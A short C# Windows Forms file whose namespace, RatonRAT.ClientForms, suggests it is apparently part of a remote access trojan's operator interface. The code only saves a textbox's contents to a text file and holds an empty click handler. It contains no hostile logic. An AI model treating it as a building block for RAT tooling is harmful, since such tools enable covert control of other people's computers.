using System;
using System.IO;
using System.Windows.Forms;

namespace RatonRAT.ClientForms
{
    public partial class FormProcessInfo : Form
    {
        public FormProcessInfo()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "Text Files (*.txt)|*.txt";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(saveFileDialog.FileName, textBox1.Text);
            }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }
    }
}
